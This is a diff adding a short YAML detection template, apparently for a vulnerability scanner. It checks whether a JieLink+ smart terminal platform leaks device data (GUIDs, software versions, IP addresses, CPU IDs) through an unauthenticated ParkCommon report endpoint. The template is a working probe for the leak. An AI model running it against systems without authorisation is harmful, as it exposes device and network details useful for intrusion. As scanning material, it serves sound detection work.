@@ -1,0 +1,25 @@
+id: poc-yaml-jielink-plus-parkcommon-info-leak
+info:
+  name: JieLink+智能终端操作平台 ParkCommon 信息泄露漏洞
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: info-leak
+http:
+  - method: GET
+    path:
+      - "/Report/ParkCommon/GetParkInThroughDeivces"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"DGUID\":"
+          - "\"Software_Version\":"
+          - "\"IP\":"
+          - "\"CpuID\":"
+      - type: word
+        words:
+          - "<"
+        negative: true
